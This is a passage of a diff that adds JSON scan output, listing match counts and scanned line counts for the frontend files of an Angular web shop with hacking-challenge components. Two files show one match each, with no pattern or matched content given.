+        "matches": 0,
+        "lines_scanned": 605
+      },
+      {
+        "file": "frontend/angular.json",
+        "matches": 0,
+        "lines_scanned": 138
+      },
+      {
+        "file": "frontend/eslint.config.js",
+        "matches": 0,
+        "lines_scanned": 56
+      },
+      {
+        "file": "frontend/package.json",
+        "matches": 0,
+        "lines_scanned": 93
+      },
+      {
+        "file": "frontend/tsconfig.base.json",
+        "matches": 0,
+        "lines_scanned": 20
+      },
+      {
+        "file": "frontend/tsconfig.json",
+        "matches": 0,
+        "lines_scanned": 20
+      },
+      {
+        "file": "frontend/src/index.html",
+        "matches": 0,
+        "lines_scanned": 30
+      },
+      {
+        "file": "frontend/src/karma.conf.js",
+        "matches": 0,
+        "lines_scanned": 40
+      },
+      {
+        "file": "frontend/src/main.ts",
+        "matches": 0,
+        "lines_scanned": 152
+      },
+      {
+        "file": "frontend/src/test.ts",
+        "matches": 0,
+        "lines_scanned": 28
+      },
+      {
+        "file": "frontend/src/tsconfig.app.json",
+        "matches": 0,
+        "lines_scanned": 15
+      },
+      {
+        "file": "frontend/src/tsconfig.spec.json",
+        "matches": 0,
+        "lines_scanned": 19
+      },
+      {
+        "file": "frontend/src/app/app.component.html",
+        "matches": 0,
+        "lines_scanned": 16
+      },
+      {
+        "file": "frontend/src/app/app.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 82
+      },
+      {
+        "file": "frontend/src/app/app.component.ts",
+        "matches": 0,
+        "lines_scanned": 34
+      },
+      {
+        "file": "frontend/src/app/app.guard.spec.ts",
+        "matches": 0,
+        "lines_scanned": 193
+      },
+      {
+        "file": "frontend/src/app/app.guard.ts",
+        "matches": 0,
+        "lines_scanned": 88
+      },
+      {
+        "file": "frontend/src/app/app.routing.ts",
+        "matches": 0,
+        "lines_scanned": 298
+      },
+      {
+        "file": "frontend/src/app/roles.ts",
+        "matches": 0,
+        "lines_scanned": 11
+      },
+      {
+        "file": "frontend/src/app/about/about.component.html",
+        "matches": 0,
+        "lines_scanned": 145
+      },
+      {
+        "file": "frontend/src/app/about/about.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 116
+      },
+      {
+        "file": "frontend/src/app/about/about.component.ts",
+        "matches": 0,
+        "lines_scanned": 130
+      },
+      {
+        "file": "frontend/src/app/accounting/accounting.component.html",
+        "matches": 0,
+        "lines_scanned": 119
+      },
+      {
+        "file": "frontend/src/app/accounting/accounting.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 203
+      },
+      {
+        "file": "frontend/src/app/accounting/accounting.component.ts",
+        "matches": 0,
+        "lines_scanned": 160
+      },
+      {
+        "file": "frontend/src/app/address/address.component.html",
+        "matches": 0,
+        "lines_scanned": 98
+      },
+      {
+        "file": "frontend/src/app/address/address.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 128
+      },
+      {
+        "file": "frontend/src/app/address/address.component.ts",
+        "matches": 0,
+        "lines_scanned": 107
+      },
+      {
+        "file": "frontend/src/app/address-create/address-create.component.html",
+        "matches": 0,
+        "lines_scanned": 122
+      },
+      {
+        "file": "frontend/src/app/address-create/address-create.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 230
+      },
+      {
+        "file": "frontend/src/app/address-create/address-create.component.ts",
+        "matches": 0,
+        "lines_scanned": 155
+      },
+      {
+        "file": "frontend/src/app/address-select/address-select.component.html",
+        "matches": 0,
+        "lines_scanned": 9
+      },
+      {
+        "file": "frontend/src/app/address-select/address-select.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 86
+      },
+      {
+        "file": "frontend/src/app/address-select/address-select.component.ts",
+        "matches": 0,
+        "lines_scanned": 26
+      },
+      {
+        "file": "frontend/src/app/administration/administration.component.html",
+        "matches": 0,
+        "lines_scanned": 119
+      },
+      {
+        "file": "frontend/src/app/administration/administration.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 144
+      },
+      {
+        "file": "frontend/src/app/administration/administration.component.ts",
+        "matches": 0,
+        "lines_scanned": 128
+      },
+      {
+        "file": "frontend/src/app/basket/basket.component.html",
+        "matches": 0,
+        "lines_scanned": 15
+      },
+      {
+        "file": "frontend/src/app/basket/basket.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 84
+      },
+      {
+        "file": "frontend/src/app/basket/basket.component.ts",
+        "matches": 0,
+        "lines_scanned": 42
+      },
+      {
+        "file": "frontend/src/app/challenge-solved-notification/challenge-solved-notification.component.html",
+        "matches": 0,
+        "lines_scanned": 54
+      },
+      {
+        "file": "frontend/src/app/challenge-solved-notification/challenge-solved-notification.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 239
+      },
+      {
+        "file": "frontend/src/app/challenge-solved-notification/challenge-solved-notification.component.ts",
+        "matches": 0,
+        "lines_scanned": 172
+      },
+      {
+        "file": "frontend/src/app/challenge-status-badge/challenge-status-badge.component.html",
+        "matches": 0,
+        "lines_scanned": 44
+      },
+      {
+        "file": "frontend/src/app/challenge-status-badge/challenge-status-badge.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 89
+      },
+      {
+        "file": "frontend/src/app/challenge-status-badge/challenge-status-badge.component.ts",
+        "matches": 0,
+        "lines_scanned": 45
+      },
+      {
+        "file": "frontend/src/app/change-password/change-password.component.html",
+        "matches": 0,
+        "lines_scanned": 157
+      },
+      {
+        "file": "frontend/src/app/change-password/change-password.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 121
+      },
+      {
+        "file": "frontend/src/app/change-password/change-password.component.ts",
+        "matches": 0,
+        "lines_scanned": 155
+      },
+      {
+        "file": "frontend/src/app/chatbot/chatbot.component.html",
+        "matches": 0,
+        "lines_scanned": 46
+      },
+      {
+        "file": "frontend/src/app/chatbot/chatbot.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 107
+      },
+      {
+        "file": "frontend/src/app/chatbot/chatbot.component.ts",
+        "matches": 0,
+        "lines_scanned": 131
+      },
+      {
+        "file": "frontend/src/app/code-area/code-area.component.html",
+        "matches": 0,
+        "lines_scanned": 7
+      },
+      {
+        "file": "frontend/src/app/code-area/code-area.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 68
+      },
+      {
+        "file": "frontend/src/app/code-area/code-area.component.ts",
+        "matches": 0,
+        "lines_scanned": 66
+      },
+      {
+        "file": "frontend/src/app/code-fixes/code-fixes.component.html",
+        "matches": 0,
+        "lines_scanned": 6
+      },
+      {
+        "file": "frontend/src/app/code-fixes/code-fixes.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 43
+      },
+      {
+        "file": "frontend/src/app/code-fixes/code-fixes.component.ts",
+        "matches": 0,
+        "lines_scanned": 68
+      },
+      {
+        "file": "frontend/src/app/code-snippet/code-snippet.component.html",
+        "matches": 0,
+        "lines_scanned": 90
+      },
+      {
+        "file": "frontend/src/app/code-snippet/code-snippet.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 218
+      },
+      {
+        "file": "frontend/src/app/code-snippet/code-snippet.component.ts",
+        "matches": 0,
+        "lines_scanned": 252
+      },
+      {
+        "file": "frontend/src/app/complaint/complaint.component.html",
+        "matches": 0,
+        "lines_scanned": 95
+      },
+      {
+        "file": "frontend/src/app/complaint/complaint.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 138
+      },
+      {
+        "file": "frontend/src/app/complaint/complaint.component.ts",
+        "matches": 0,
+        "lines_scanned": 120
+      },
+      {
+        "file": "frontend/src/app/contact/contact.component.html",
+        "matches": 0,
+        "lines_scanned": 75
+      },
+      {
+        "file": "frontend/src/app/contact/contact.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 211
+      },
+      {
+        "file": "frontend/src/app/contact/contact.component.ts",
+        "matches": 0,
+        "lines_scanned": 144
+      },
+      {
+        "file": "frontend/src/app/ctf-system-wide-notification/ctf-system-wide-notification.component.html",
+        "matches": 0,
+        "lines_scanned": 17
+      },
+      {
+        "file": "frontend/src/app/ctf-system-wide-notification/ctf-system-wide-notification.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 176
+      },
+      {
+        "file": "frontend/src/app/ctf-system-wide-notification/ctf-system-wide-notification.component.ts",
+        "matches": 0,
+        "lines_scanned": 64
+      },
+      {
+        "file": "frontend/src/app/data-export/data-export.component.html",
+        "matches": 0,
+        "lines_scanned": 60
+      },
+      {
+        "file": "frontend/src/app/data-export/data-export.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 118
+      },
+      {
+        "file": "frontend/src/app/data-export/data-export.component.ts",
+        "matches": 1,
+        "lines_scanned": 99
+      },
+      {
+        "file": "frontend/src/app/delivery-method/delivery-method.component.html",
+        "matches": 0,
+        "lines_scanned": 66
+      },
+      {
+        "file": "frontend/src/app/delivery-method/delivery-method.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 122
+      },
+      {
+        "file": "frontend/src/app/delivery-method/delivery-method.component.ts",
+        "matches": 0,
+        "lines_scanned": 81
+      },
+      {
+        "file": "frontend/src/app/deluxe-user/deluxe-user.component.html",
+        "matches": 0,
+        "lines_scanned": 45
+      },
+      {
+        "file": "frontend/src/app/deluxe-user/deluxe-user.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 120
+      },
+      {
+        "file": "frontend/src/app/deluxe-user/deluxe-user.component.ts",
+        "matches": 0,
+        "lines_scanned": 92
+      },
+      {
+        "file": "frontend/src/app/error-page/error-page.component.html",
+        "matches": 0,
+        "lines_scanned": 11
+      },
+      {
+        "file": "frontend/src/app/error-page/error-page.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 43
+      },
+      {
+        "file": "frontend/src/app/error-page/error-page.component.ts",
+        "matches": 0,
+        "lines_scanned": 40
+      },
+      {
+        "file": "frontend/src/app/faucet/faucet.component.html",
+        "matches": 0,
+        "lines_scanned": 86
+      },
+      {
+        "file": "frontend/src/app/faucet/faucet.component.ts",
+        "matches": 0,
+        "lines_scanned": 316
+      },
+      {
+        "file": "frontend/src/app/faucet/faucet.module.ts",
+        "matches": 0,
+        "lines_scanned": 49
+      },
+      {
+        "file": "frontend/src/app/feedback-details/feedback-details.component.html",
+        "matches": 0,
+        "lines_scanned": 30
+      },
+      {
+        "file": "frontend/src/app/feedback-details/feedback-details.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 46
+      },
+      {
+        "file": "frontend/src/app/feedback-details/feedback-details.component.ts",
+        "matches": 0,
+        "lines_scanned": 30
+      },
+      {
+        "file": "frontend/src/app/forgot-password/forgot-password.component.html",
+        "matches": 0,
+        "lines_scanned": 120
+      },
+      {
+        "file": "frontend/src/app/forgot-password/forgot-password.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 191
+      },
+      {
+        "file": "frontend/src/app/forgot-password/forgot-password.component.ts",
+        "matches": 0,
+        "lines_scanned": 144
+      },
+      {
+        "file": "frontend/src/app/last-login-ip/last-login-ip.component.html",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "frontend/src/app/last-login-ip/last-login-ip.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 71
+      },
+      {
+        "file": "frontend/src/app/last-login-ip/last-login-ip.component.ts",
+        "matches": 0,
+        "lines_scanned": 43
+      },
+      {
+        "file": "frontend/src/app/login/login.component.html",
+        "matches": 0,
+        "lines_scanned": 105
+      },
+      {
+        "file": "frontend/src/app/login/login.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 174
+      },
+      {
+        "file": "frontend/src/app/login/login.component.ts",
+        "matches": 0,
+        "lines_scanned": 136
+      },
+      {
+        "file": "frontend/src/app/mat-search-bar/abstract-value-accessor.ts",
+        "matches": 0,
+        "lines_scanned": 46
+      },
+      {
+        "file": "frontend/src/app/mat-search-bar/mat-search-bar.component.html",
+        "matches": 0,
+        "lines_scanned": 15
+      },
+      {
+        "file": "frontend/src/app/mat-search-bar/mat-search-bar.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 106
+      },
+      {
+        "file": "frontend/src/app/mat-search-bar/mat-search-bar.component.ts",
+        "matches": 0,
+        "lines_scanned": 102
+      },
+      {
+        "file": "frontend/src/app/Models/backup.model.ts",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "frontend/src/app/Models/challenge.model.ts",
+        "matches": 0,
+        "lines_scanned": 24
+      },
+      {
+        "file": "frontend/src/app/Models/deliveryMethod.model.ts",
+        "matches": 0,
+        "lines_scanned": 12
+      },
+      {
+        "file": "frontend/src/app/Models/hint.model.ts",
+        "matches": 0,
+        "lines_scanned": 12
+      },
+      {
+        "file": "frontend/src/app/Models/product.model.ts",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "frontend/src/app/Models/review.model.ts",
+        "matches": 0,
+        "lines_scanned": 10
+      },
+      {
+        "file": "frontend/src/app/Models/securityQuestion.model.ts",
+        "matches": 0,
+        "lines_scanned": 9
+      },
+      {
+        "file": "frontend/src/app/navbar/navbar.component.html",
+        "matches": 0,
+        "lines_scanned": 245
+      },
+      {
+        "file": "frontend/src/app/navbar/navbar.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 282
+      },
+      {
+        "file": "frontend/src/app/navbar/navbar.component.ts",
+        "matches": 0,
+        "lines_scanned": 303
+      },
+      {
+        "file": "frontend/src/app/nft-unlock/nft-unlock.component.html",
+        "matches": 0,
+        "lines_scanned": 71
+      },
+      {
+        "file": "frontend/src/app/nft-unlock/nft-unlock.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 92
+      },
+      {
+        "file": "frontend/src/app/nft-unlock/nft-unlock.component.ts",
+        "matches": 0,
+        "lines_scanned": 69
+      },
+      {
+        "file": "frontend/src/app/oauth/oauth.component.html",
+        "matches": 0,
+        "lines_scanned": 13
+      },
+      {
+        "file": "frontend/src/app/oauth/oauth.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 100
+      },
+      {
+        "file": "frontend/src/app/oauth/oauth.component.ts",
+        "matches": 0,
+        "lines_scanned": 80
+      },
+      {
+        "file": "frontend/src/app/order-completion/order-completion.component.html",
+        "matches": 0,
+        "lines_scanned": 102
+      },
+      {
+        "file": "frontend/src/app/order-completion/order-completion.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 162
+      },
+      {
+        "file": "frontend/src/app/order-completion/order-completion.component.ts",
+        "matches": 0,
+        "lines_scanned": 106
+      },
+      {
+        "file": "frontend/src/app/order-history/order-history.component.html",
+        "matches": 0,
+        "lines_scanned": 108
+      },
+      {
+        "file": "frontend/src/app/order-history/order-history.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 123
+      },
+      {
+        "file": "frontend/src/app/order-history/order-history.component.ts",
+        "matches": 0,
+        "lines_scanned": 124
+      },
+      {
+        "file": "frontend/src/app/order-summary/order-summary.component.html",
+        "matches": 0,
+        "lines_scanned": 80
+      },
+      {
+        "file": "frontend/src/app/order-summary/order-summary.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 155
+      },
+      {
+        "file": "frontend/src/app/order-summary/order-summary.component.ts",
+        "matches": 0,
+        "lines_scanned": 95
+      },
+      {
+        "file": "frontend/src/app/password-strength/password-strength.component.html",
+        "matches": 0,
+        "lines_scanned": 11
+      },
+      {
+        "file": "frontend/src/app/password-strength/password-strength.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 89
+      },
+      {
+        "file": "frontend/src/app/password-strength/password-strength.component.ts",
+        "matches": 0,
+        "lines_scanned": 65
+      },
+      {
+        "file": "frontend/src/app/password-strength-info/password-strength-info.component.html",
+        "matches": 0,
+        "lines_scanned": 54
+      },
+      {
+        "file": "frontend/src/app/password-strength-info/password-strength-info.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 24
+      },
+      {
+        "file": "frontend/src/app/password-strength-info/password-strength-info.component.ts",
+        "matches": 0,
+        "lines_scanned": 44
+      },
+      {
+        "file": "frontend/src/app/payment/payment.component.html",
+        "matches": 0,
+        "lines_scanned": 177
+      },
+      {
+        "file": "frontend/src/app/payment/payment.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 327
+      },
+      {
+        "file": "frontend/src/app/payment/payment.component.ts",
+        "matches": 0,
+        "lines_scanned": 298
+      },
+      {
+        "file": "frontend/src/app/payment-method/payment-method.component.html",
+        "matches": 0,
+        "lines_scanned": 110
+      },
+      {
+        "file": "frontend/src/app/payment-method/payment-method.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 181
+      },
+      {
+        "file": "frontend/src/app/payment-method/payment-method.component.ts",
+        "matches": 0,
+        "lines_scanned": 128
+      },
+      {
+        "file": "frontend/src/app/photo-wall/mime-type.validator.ts",
+        "matches": 0,
+        "lines_scanned": 52
+      },
+      {
+        "file": "frontend/src/app/photo-wall/photo-wall.component.html",
+        "matches": 0,
+        "lines_scanned": 84
+      },
+      {
+        "file": "frontend/src/app/photo-wall/photo-wall.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 156
+      },
+      {
+        "file": "frontend/src/app/photo-wall/photo-wall.component.ts",
+        "matches": 0,
+        "lines_scanned": 119
+      },
+      {
+        "file": "frontend/src/app/privacy-policy/privacy-policy.component.html",
+        "matches": 0,
+        "lines_scanned": 174
+      },
+      {
+        "file": "frontend/src/app/privacy-policy/privacy-policy.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 64
+      },
+      {
+        "file": "frontend/src/app/privacy-policy/privacy-policy.component.ts",
+        "matches": 0,
+        "lines_scanned": 43
+      },
+      {
+        "file": "frontend/src/app/privacy-security/privacy-security.component.html",
+        "matches": 0,
+        "lines_scanned": 6
+      },
+      {
+        "file": "frontend/src/app/privacy-security/privacy-security.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 34
+      },
+      {
+        "file": "frontend/src/app/privacy-security/privacy-security.component.ts",
+        "matches": 0,
+        "lines_scanned": 15
+      },
+      {
+        "file": "frontend/src/app/product-details/product-details.component.html",
+        "matches": 0,
+        "lines_scanned": 111
+      },
+      {
+        "file": "frontend/src/app/product-details/product-details.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 176
+      },
+      {
+        "file": "frontend/src/app/product-details/product-details.component.ts",
+        "matches": 0,
+        "lines_scanned": 105
+      },
+      {
+        "file": "frontend/src/app/product-review-edit/product-review-edit.component.html",
+        "matches": 0,
+        "lines_scanned": 35
+      },
+      {
+        "file": "frontend/src/app/product-review-edit/product-review-edit.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 96
+      },
+      {
+        "file": "frontend/src/app/product-review-edit/product-review-edit.component.ts",
+        "matches": 0,
+        "lines_scanned": 58
+      },
+      {
+        "file": "frontend/src/app/purchase-basket/purchase-basket.component.html",
+        "matches": 0,
+        "lines_scanned": 69
+      },
+      {
+        "file": "frontend/src/app/purchase-basket/purchase-basket.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 266
+      },
+      {
+        "file": "frontend/src/app/purchase-basket/purchase-basket.component.ts",
+        "matches": 0,
+        "lines_scanned": 123
+      },
+      {
+        "file": "frontend/src/app/qr-code/qr-code.component.html",
+        "matches": 0,
+        "lines_scanned": 28
+      },
+      {
+        "file": "frontend/src/app/qr-code/qr-code.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 50
+      },
+      {
+        "file": "frontend/src/app/qr-code/qr-code.component.ts",
+        "matches": 0,
+        "lines_scanned": 37
+      },
+      {
+        "file": "frontend/src/app/recycle/recycle.component.html",
+        "matches": 0,
+        "lines_scanned": 90
+      },
+      {
+        "file": "frontend/src/app/recycle/recycle.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 221
+      },
+      {
+        "file": "frontend/src/app/recycle/recycle.component.ts",
+        "matches": 0,
+        "lines_scanned": 151
+      },
+      {
+        "file": "frontend/src/app/register/register.component.html",
+        "matches": 0,
+        "lines_scanned": 132
+      },
+      {
+        "file": "frontend/src/app/register/register.component.spec.ts",
+        "matches": 1,
+        "lines_scanned": 189
+      },
+      {
+        "file": "frontend/src/app/register/register.component.ts",
+        "matches": 0,
+        "lines_scanned": 117
+      },
+      {
+        "file": "frontend/src/app/saved-address/saved-address.component.html",
+        "matches": 0,
+        "lines_scanned": 8
+      },
+      {
+        "file": "frontend/src/app/saved-address/saved-address.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 66
+      },
+      {
+        "file": "frontend/src/app/saved-address/saved-address.component.ts",
+        "matches": 0,
+        "lines_scanned": 17
+      },
+      {
+        "file": "frontend/src/app/saved-payment-methods/saved-payment-methods.component.html",
+        "matches": 0,
+        "lines_scanned": 10
+      },
+      {
+        "file": "frontend/src/app/saved-payment-methods/saved-payment-methods.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 73
+      },
+      {
+        "file": "frontend/src/app/saved-payment-methods/saved-payment-methods.component.ts",
+        "matches": 0,
+        "lines_scanned": 18
+      },
+      {
+        "file": "frontend/src/app/score-board/score-board.component.html",
+        "matches": 0,
+        "lines_scanned": 58
+      },
+      {
+        "file": "frontend/src/app/score-board/score-board.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 214
+      },
+      {
+        "file": "frontend/src/app/score-board/score-board.component.ts",
+        "matches": 0,
+        "lines_scanned": 242
+      },
+      {
+        "file": "frontend/src/app/score-board/components/challenge-card/challenge-card.component.html",
+        "matches": 0,
+        "lines_scanned": 106
+      },
+      {
+        "file": "frontend/src/app/score-board/components/challenge-card/challenge-card.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 127
+      },
+      {
+        "file": "frontend/src/app/score-board/components/challenge-card/challenge-card.component.ts",
+        "matches": 0,
+        "lines_scanned": 100
+      },
+      {
+        "file": "frontend/src/app/score-board/components/challenges-unavailable-warning/challenges-unavailable-warning.component.html",
+        "matches": 0,
+        "lines_scanned": 23
+      },
+      {
+        "file": "frontend/src/app/score-board/components/challenges-unavailable-warning/challenges-unavailable-warning.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 109
+      },
+      {
+        "file": "frontend/src/app/score-board/components/challenges-unavailable-warning/challenges-unavailable-warning.component.ts",
+        "matches": 0,
+        "lines_scanned": 52
+      },
+      {
+        "file": "frontend/src/app/score-board/components/coding-challenge-progress-score-card/coding-challenge-progress-score-card.component.html",
+        "matches": 0,
+        "lines_scanned": 36
+      },
+      {
+        "file": "frontend/src/app/score-board/components/coding-challenge-progress-score-card/coding-challenge-progress-score-card.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 26
+      },
+      {
+        "file": "frontend/src/app/score-board/components/coding-challenge-progress-score-card/coding-challenge-progress-score-card.component.ts",
+        "matches": 0,
+        "lines_scanned": 38
+      },
+      {
+        "file": "frontend/src/app/score-board/components/difficulty-overview-score-card/difficulty-overview-score-card.component.html",
+        "matches": 0,
+        "lines_scanned": 48
+      },
+      {
+        "file": "frontend/src/app/score-board/components/difficulty-overview-score-card/difficulty-overview-score-card.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 71
+      },
+      {
+        "file": "frontend/src/app/score-board/components/difficulty-overview-score-card/difficulty-overview-score-card.component.ts",
+        "matches": 0,
+        "lines_scanned": 86
+      },
+      {
+        "file": "frontend/src/app/score-board/components/difficulty-stars/difficulty-stars.component.html",
+        "matches": 0,
+        "lines_scanned": 14
+      },
+      {
+        "file": "frontend/src/app/score-board/components/difficulty-stars/difficulty-stars.component.ts",
+        "matches": 0,
+        "lines_scanned": 12
+      },
+      {
+        "file": "frontend/src/app/score-board/components/filter-settings/filter-settings.component.html",
+        "matches": 0,
+        "lines_scanned": 81
+      },
+      {
+        "file": "frontend/src/app/score-board/components/filter-settings/filter-settings.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 134
+      },
+      {
+        "file": "frontend/src/app/score-board/components/filter-settings/filter-settings.component.ts",
+        "matches": 0,
+        "lines_scanned": 87
+      },
+      {
+        "file": "frontend/src/app/score-board/components/filter-settings/components/category-filter/category-filter.component.html",
+        "matches": 0,
+        "lines_scanned": 17
+      },
+      {
+        "file": "frontend/src/app/score-board/components/filter-settings/components/category-filter/category-filter.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 58
+      },
+      {
+        "file": "frontend/src/app/score-board/components/filter-settings/components/category-filter/category-filter.component.ts",
+        "matches": 0,
+        "lines_scanned": 59
+      },
+      {
+        "file": "frontend/src/app/score-board/components/filter-settings/components/score-board-additional-settings-dialog/score-board-additional-settings-dialog.component.html",
+        "matches": 0,
+        "lines_scanned": 27
+      },
+      {
+        "file": "frontend/src/app/score-board/components/filter-settings/components/score-board-additional-settings-dialog/score-board-additional-settings-dialog.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 37
+      },
+      {
+        "file": "frontend/src/app/score-board/components/filter-settings/components/score-board-additional-settings-dialog/score-board-additional-settings-dialog.component.ts",
+        "matches": 0,
+        "lines_scanned": 17
+      },
+      {
+        "file": "frontend/src/app/score-board/components/filter-settings/pipes/difficulty-selection-summary.pipe.spec.ts",
+        "matches": 0,
+        "lines_scanned": 19
+      },
+      {
+        "file": "frontend/src/app/score-board/components/filter-settings/pipes/difficulty-selection-summary.pipe.ts",
+        "matches": 0,
+        "lines_scanned": 54
+      },
+      {
+        "file": "frontend/src/app/score-board/components/hacking-challenge-progress-score-card/hacking-challenge-progress-score-card.component.html",
+        "matches": 0,
+        "lines_scanned": 32
+      },
+      {
+        "file": "frontend/src/app/score-board/components/hacking-challenge-progress-score-card/hacking-challenge-progress-score-card.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 25
+      },
+      {
+        "file": "frontend/src/app/score-board/components/hacking-challenge-progress-score-card/hacking-challenge-progress-score-card.component.ts",
+        "matches": 0,
+        "lines_scanned": 29
+      },
+      {
+        "file": "frontend/src/app/score-board/components/score-card/score-card.component.html",
+        "matches": 0,
+        "lines_scanned": 18
+      },
+      {
+        "file": "frontend/src/app/score-board/components/score-card/score-card.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 23
+      },
+      {
+        "file": "frontend/src/app/score-board/components/score-card/score-card.component.ts",
+        "matches": 0,
+        "lines_scanned": 25
+      },
+      {
+        "file": "frontend/src/app/score-board/components/tutorial-mode-warning/tutorial-mode-warning.component.html",
+        "matches": 0,
+        "lines_scanned": 8
+      },
+      {
+        "file": "frontend/src/app/score-board/components/tutorial-mode-warning/tutorial-mode-warning.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 77
+      },
+      {
+        "file": "frontend/src/app/score-board/components/tutorial-mode-warning/tutorial-mode-warning.component.ts",
+        "matches": 0,
+        "lines_scanned": 34
+      },
+      {
+        "file": "frontend/src/app/score-board/components/warning-card/warning-card.component.html",
+        "matches": 0,
+        "lines_scanned": 14
+      },
+      {
+        "file": "frontend/src/app/score-board/components/warning-card/warning-card.component.ts",
+        "matches": 0,
+        "lines_scanned": 9
+      },
+      {
+        "file": "frontend/src/app/score-board/filter-settings/FilterSetting.ts",
+        "matches": 0,
+        "lines_scanned": 34
+      },
+      {
+        "file": "frontend/src/app/score-board/filter-settings/query-params-converters.ts",
+        "matches": 0,
+        "lines_scanned": 41
+      },
+      {
+        "file": "frontend/src/app/score-board/filter-settings/query-params-coverter.spec.ts",
+        "matches": 0,
+        "lines_scanned": 101
+      },
+      {
+        "file": "frontend/src/app/score-board/helpers/challenge-filtering.spec.ts",
+        "matches": 0,
+        "lines_scanned": 159
+      },
+      {
+        "file": "frontend/src/app/score-board/helpers/challenge-filtering.ts",
+        "matches": 0,
+        "lines_scanned": 108
+      },
+      {
+        "file": "frontend/src/app/score-board/helpers/challenge-sorting.spec.ts",
+        "matches": 0,
+        "lines_scanned": 79
+      },
+      {
+        "file": "frontend/src/app/score-board/helpers/challenge-sorting.ts",
+        "matches": 0,
+        "lines_scanned": 9
+      },
+      {
+        "file": "frontend/src/app/score-board/types/EnrichedChallenge.ts",
+        "matches": 0,
+        "lines_scanned": 10
+      },
+      {
+        "file": "frontend/src/app/search-result/search-result.component.html",
+        "matches": 0,
+        "lines_scanned": 101
+      },
+      {
+        "file": "frontend/src/app/search-result/search-result.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 352
+      },
+      {
+        "file": "frontend/src/app/search-result/search-result.component.ts",
+        "matches": 0,
+        "lines_scanned": 281
+      },
+      {
+        "file": "frontend/src/app/server-started-notification/server-started-notification.component.html",
+        "matches": 0,
+        "lines_scanned": 20
+      },
+      {
+        "file": "frontend/src/app/server-started-notification/server-started-notification.component.spec.ts",
+        "matches": 0,
+        "lines_scanned": 169
+      },
+      {
+        "file": "frontend/src/app/server-started-notification/server-started-notification.component.ts",
+        "matches": 0,
+        "lines_scanned": 109
+      },
+      {
+        "file": "frontend/src/app/Services/address.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 113
+      },
+      {
+        "file": "frontend/src/app/Services/address.service.ts",
+        "matches": 0,
+        "lines_scanned": 41
+      },
+      {
+        "file": "frontend/src/app/Services/administration.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 51
+      },
+      {
+        "file": "frontend/src/app/Services/administration.service.ts",
+        "matches": 0,
+        "lines_scanned": 26
+      },
+      {
+        "file": "frontend/src/app/Services/basket.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 160
+      },
+      {
+        "file": "frontend/src/app/Services/basket.service.ts",
+        "matches": 0,
+        "lines_scanned": 69
+      },
+      {
+        "file": "frontend/src/app/Services/captcha.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 50
+      },
+      {
+        "file": "frontend/src/app/Services/captcha.service.ts",
+        "matches": 0,
+        "lines_scanned": 23
+      },
+      {
+        "file": "frontend/src/app/Services/challenge.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 256
+      },
+      {
+        "file": "frontend/src/app/Services/challenge.service.ts",
+        "matches": 0,
+        "lines_scanned": 53
+      },
+      {
+        "file": "frontend/src/app/Services/chatbot.service.spec.ts",
+        "matches": 0,
+        "lines_scanned": 83
+      },
+      {
